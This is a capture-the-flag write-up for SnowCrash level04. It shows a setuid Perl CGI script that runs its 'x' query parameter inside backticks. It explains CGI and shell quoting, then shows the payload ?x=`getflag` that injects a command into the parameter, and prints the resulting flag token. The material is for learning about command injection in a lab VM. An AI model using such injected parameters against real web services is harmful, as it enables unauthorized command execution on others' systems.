# Level04

```bash
level04@SnowCrash:~$ ls -l
-rwsr-s-r-x 1 flag04 level04 152 Mar 5 2016 level04.pl
```
Again this setuid, that means this program can executes commands as flag04.

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
We can see 2 things: <br/>
1. We can see that localhost:4747 is used, as well as CGI. 
`CGI stands for Common Gateway Interface, it’s a protocol for executing scripts via web requests, and in the late 1990’s was the main way to write dynamic programs for the Web. It’s also the name of the Perl module we used [...] to code for the web.` <br/>
https://www.perl.com/article/perl-and-cgi/
2. The print uses \`\` (Backquotes), and any command put between backquotes will be executed.
https://www.tutorialspoint.com/unix/unix-quoting-mechanisms.htm



Open a web browser, connect to the VM IP address on port 4747, for example: http://10.0.2.15:4747/

`The first way to pass data is with the query string, (the portion of a URI beginning with ?), which you see in URLs like https://example.com/?foo=bar. This uses the “GET” request method, and becomes available to the program as $ENV->{QUERY_STRING}, which in this case is foo=bar (CGI programs receive their arguments as environment variables).`<br/>
https://www.perl.com/article/perl-and-cgi/

Use the query string to pass the getflag command: </br>
`http://192.168.1.67:4747/?x=getflag` will not work as it will only print the string getflag </br>
But \`getflag\` will be taken as command (try print/echo \`getflag\` in terminal for example)

`ne2searoevaevoem4ov4ar8ap` 
